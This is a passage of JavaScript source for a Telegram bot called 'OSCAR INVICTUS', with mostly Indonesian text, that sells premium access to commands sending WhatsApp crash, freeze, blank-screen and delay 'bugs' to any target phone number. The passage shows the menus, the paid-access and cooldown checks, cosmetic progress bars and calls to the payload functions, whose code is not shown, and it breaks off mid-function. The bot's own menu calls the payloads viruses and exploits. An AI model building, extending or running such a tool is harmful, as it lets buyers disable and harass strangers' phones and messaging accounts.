    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>äº¤ OSCAR INVICTUS á„</blockquote>
( ğŸ‘€ ) Holaa â˜‡ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote># ğˆğ§ğŸğ¨ğ«ğ¦ğšğ¬ğ¢ ğğ¨ğ­</blockquote>
â¬¡ Author : @VallOffcial
â¬¡ Version : 3.1 Vip!!
â¬¡ Framework : Telegraf
â¬¡ Library : Javascript
â¬¡ Runtime : ${runtime}
â¬¡ Date now : ${date}
<blockquote>Â© OSCAR INVICTUS á„</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "OSCAR BUG" , callback_data: "bugmenu" }, 
        { text: "THANKS TO", callback_data: "thanksto" }],
        [{ text: "OWNER MENU", callback_data: "ownermenu" }],
        [{ text: "DEV OSCAR", url: "https://t.me/VallOffcial" }, 
        { text: "INFORMASI", url: "https://t.me/OscarInvictus" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `<blockquote><b>( ! ) - OSCAR INVICTUS</b>
<b>ğ™³ğšŠğšğšğšŠğš› ğšğš’ğšğšğš› ğšğš”ğšœğš™ğš•ğš˜ğš’ğš ğš¢ğšŠğš—ğš ğšğšğš›ğšœğšğšğš’ğšŠ.</b>

<b>â–¢ /oscarvisible â˜‡ É´á´œá´Ê™á´‡Ê€</b>
<b>â•°â¤ Invisible hard</b>

<b>â–¢ /oscarui â˜‡ É´á´œá´Ê™á´‡Ê€</b>
<b>â•°â¤ Ui system + invis</b>

<b>â–¢ /oscarblank â˜‡ É´á´œá´Ê™á´‡Ê€</b>
<b>â•°â¤ blank all device</b>

<b>â–¢ /oscarfreeze â˜‡ É´á´œá´Ê™á´‡Ê€</b>
<b>â•°â¤ Freeze nyetuk</b>

<b>â–¢ /fixedbug â˜‡ É´á´œá´Ê™á´‡Ê€</b>
<b>â•°â¤ Menghapus bug yg sudah terkirim</b>

<b>-# ( ! ) Note :</b>
<b>Jangan asal mengirim virus ke orang yg tidak bersalah kalo tidak mau ber akibat fatall!!</b>
</blockquote>`;
    newButtons = [[{ text: "Ê™á´€á´„á´‹ â†º", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote><b>( ! ) - OSCAR INVICTUS Akses</b>
</blockquote>
<b>â–¢ /addprem id â˜‡ days</b>
<b>â•°â¤ Menambahkan akses pada user</b>

<b>â–¢ /delprem id</b>
<b>â•°â¤ Menghapus akses pada user</b>

<b>â–¢ /addadmin id</b>
<b>â•°â¤ Menambahkan akses admin pada user</b>

<b>â–¢ /deladmin id</b>
<b>â•°â¤ Menghapus akses admin pada use</b>

<b>â–¢ /listprem</b>
<b>â•°â¤ Melihat list premium user yang ada</b>

<b>â–¢ /addsender  â˜‡ Number</b>
<b>â•°â¤ Menambah Sender WhatsApp</b>

<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>`;
    newButtons = [[{ text: "Ê™á´€á´„á´‹ â†º", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `<blockquote><b>( ! ) - Thanks Too</b>

<b>â–¢ VallOffcial ( Author )</b>
<b>â–¢ Wolf ( My support )</b>
<b>â–¢ EvilCyt ( My support )</b>
<b>â–¢ Linux ( My support )</b>
<b>â–¢ Frmnz.js ( My support )</b>
<b>â–¢ Zepyrine ( My support )</b>
<b>â–¢ Erlangga ( Dev Sasukeh )</b>
<b>â–¢ AzzCrow ( Dev Crow )</b>
<b>â–¢ ALL PT/BUYERR OSCAR INVICTUS</b>

<b>thanks OSCAR INVICTUS</b>
</blockquote>`;
    newButtons = [[{ text: "Ê™á´€á´„á´‹ â†º", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>äº¤ OSCAR INVICTUS á„</blockquote>
( ğŸ‘€ ) Holaa â˜‡ . use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote># ğˆğ§ğŸğ¨ğ«ğ¦ğšğ¬ğ¢ ğğ¨ğ­</blockquote>
â¬¡ Author : @VallOffcial
â¬¡ Version : 3.1 Vip!!
â¬¡ Framework : Telegraf
â¬¡ Library : Javascript
â¬¡ Runtime : ${runtime}
â¬¡ Date now : ${date}
<blockquote>Â© OSCAR INVICTUS á„</blockquote>
`;
    newButtons = [
        [{ text: "OSCAR BUG", callback_data: "bugmenu" }, 
        { text: "THANKS TO", callback_data: "thanksto" }],
        [{ text: "OWNER MENU", callback_data: "ownermenu" }],
        [{ text: "DEV OSCAR", url: "https://t.me/VallOffcial" }, 
        { text: "INFORMASI", url: "https://t.me/OscarInvictus" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


//=======CASE BUG=========//
bot.onText(/\/oscarvisible (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Ğ˜Ğ·Ğ²Ğ¸Ğ½Ğ¸, Ğ´Ğ¾Ñ€Ğ¾Ğ³Ğ°Ñ, Ñƒ Ñ‚ĞµĞ±Ñ Ğ½ĞµÑ‚ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ²ÑĞ·Ğ°Ñ‚ÑŒÑÑ Ñ Ğ½Ğ¸Ğ¼, Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾ Ñƒ Ğ½ĞµĞ³Ğ¾ ĞµÑÑ‚ÑŒ ĞºÑ‚Ğ¾-Ñ‚Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ¹ ( ğŸ«€ ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `â³ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "âŒ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- OSCAR INVICTUS
â•°â¤ I N V I S â˜‡  B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : ğŸ”„ Mengirim bug...
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 10%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘] 30%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘] 50%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘] 70%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘] 90%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%\nâœ… ğ™ğ™ªğ™˜ğ™˜ğ™šğ™¨ğ™¨ ğ™ğ™šğ™£ğ™™ğ™ğ™£ğ™œ ğ˜½ğ™ªğ™œ!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ I N V I S â˜‡  B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : â³ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
   
    await Delayy(jid);
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! ğŸš€");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ D E L A Y â˜‡  B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : âœ… Sukses!
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `âŒ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/oscarui (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Ğ˜Ğ·Ğ²Ğ¸Ğ½Ğ¸, Ğ´Ğ¾Ñ€Ğ¾Ğ³Ğ°Ñ, Ñƒ Ñ‚ĞµĞ±Ñ Ğ½ĞµÑ‚ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ²ÑĞ·Ğ°Ñ‚ÑŒÑÑ Ñ Ğ½Ğ¸Ğ¼, Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾ Ñƒ Ğ½ĞµĞ³Ğ¾ ĞµÑÑ‚ÑŒ ĞºÑ‚Ğ¾-Ñ‚Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ¹ ( ğŸ«€ ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `â³ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "âŒ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- OSCAR INVICTUS
â•°â¤  U I - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : ğŸ”„ Mengirim bug...
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 10%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘] 30%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘] 50%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘] 70%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘] 90%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%\nâœ… ğ™ğ™ªğ™˜ğ™˜ğ™šğ™¨ğ™¨ ğ™ğ™šğ™£ğ™™ğ™ğ™£ğ™œ ğ˜½ğ™ªğ™œ!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ U I - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : â³ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Uikontol(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! ğŸš€");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ U I- B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : âœ… Sukses!
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `âŒ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/cn (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Ğ˜Ğ·Ğ²Ğ¸Ğ½Ğ¸, Ğ´Ğ¾Ñ€Ğ¾Ğ³Ğ°Ñ, Ñƒ Ñ‚ĞµĞ±Ñ Ğ½ĞµÑ‚ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ²ÑĞ·Ğ°Ñ‚ÑŒÑÑ Ñ Ğ½Ğ¸Ğ¼, Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾ Ñƒ Ğ½ĞµĞ³Ğ¾ ĞµÑÑ‚ÑŒ ĞºÑ‚Ğ¾-Ñ‚Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ¹ ( ğŸ«€ ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `â³ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "âŒ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- OSCAR INVICTUS
â•°â¤ B L A N K - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : ğŸ”„ Mengirim bug...
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 10%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘] 30%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘] 50%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘] 70%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘] 90%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%\nâœ… ğ™ğ™ªğ™˜ğ™˜ğ™šğ™¨ğ™¨ ğ™ğ™šğ™£ğ™™ğ™ğ™£ğ™œ ğ˜½ğ™ªğ™œ!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ B L A N K - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : â³ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crashnull(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! ğŸš€");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ B L A N K - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : âœ… Sukses!
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `âŒ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/oscarfreeze (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Ğ˜Ğ·Ğ²Ğ¸Ğ½Ğ¸, Ğ´Ğ¾Ñ€Ğ¾Ğ³Ğ°Ñ, Ñƒ Ñ‚ĞµĞ±Ñ Ğ½ĞµÑ‚ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ²ÑĞ·Ğ°Ñ‚ÑŒÑÑ Ñ Ğ½Ğ¸Ğ¼, Ğ¿Ğ¾Ñ‚Ğ¾Ğ¼Ñƒ Ñ‡Ñ‚Ğ¾ Ñƒ Ğ½ĞµĞ³Ğ¾ ĞµÑÑ‚ÑŒ ĞºÑ‚Ğ¾-Ñ‚Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ¹ ( ğŸ«€ ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `â³ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "âŒ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- OSCAR INVICTUS
â•°â¤F R E E Z - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : ğŸ”„ Mengirim bug...
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 10%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘] 30%", delay: 200 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘] 50%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘] 70%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘] 90%", delay: 100 },
      { text: "â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%\nâœ… ğ™ğ™ªğ™˜ğ™˜ğ™šğ™¨ğ™¨ ğ™ğ™šğ™£ğ™™ğ™ğ™£ğ™œ ğ˜½ğ™ªğ™œ!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ F R E E Z - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : â³ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Feeeze(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! ğŸš€");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- OSCAR INVICTUS
â•°â¤ F R E E Z - B U G
 â–¢ á´›á´€Ê€É¢á´‡á´› : ${formattedNumber}
 â–¢ ğ‘ºğ’•ğ’‚ğ’•ğ’–ğ’” : âœ… Sukses!
 â–¢ ğ™‹ğ™§ğ™¤ğ™œğ™§ğ™šğ™¨ : [â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `âŒ Gagal mengirim bug: ${error.message}`);
  }
});

//hapus bug
bot.onText(/\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
